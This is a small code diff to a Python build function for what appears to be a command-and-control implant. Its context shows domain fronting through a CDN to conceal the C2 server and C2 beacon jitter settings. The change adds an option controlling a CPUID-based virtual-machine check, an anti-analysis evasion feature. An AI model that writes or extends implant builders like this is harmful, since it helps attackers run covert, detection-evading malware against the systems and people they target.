@@ -325,6 +325,7 @@ def build_runner(
     # Task 13: domain fronting — when set, the runner connects to front_host
     # (CDN edge) but sends Host: c2_host so the CDN forwards to the real C2.
     front_host:        str | None = None,
+    allow_vm:          bool = True,   # True = define LT_ALLOW_VM (disable CPUID check)
     keep_src:          bool = False,
     keep_exe:          bool = False,
 ) -> tuple[bool, int]:
@@ -395,6 +396,7 @@ def build_runner(
         f"-DLT_C2_JITTER_MIN={c2_jitter_min_ms}",
         f"-DLT_C2_JITTER_MAX={c2_jitter_max_ms}",
         f"-DLT_SCHANNEL_ALGIDS={sch_algs_macro}",
+        *(["-DLT_ALLOW_VM"] if allow_vm else []),
         "-O2", "-s",
         "-Wall", "-Wno-unused-variable", "-Wno-unused-function",
         "-mno-stack-arg-probe",
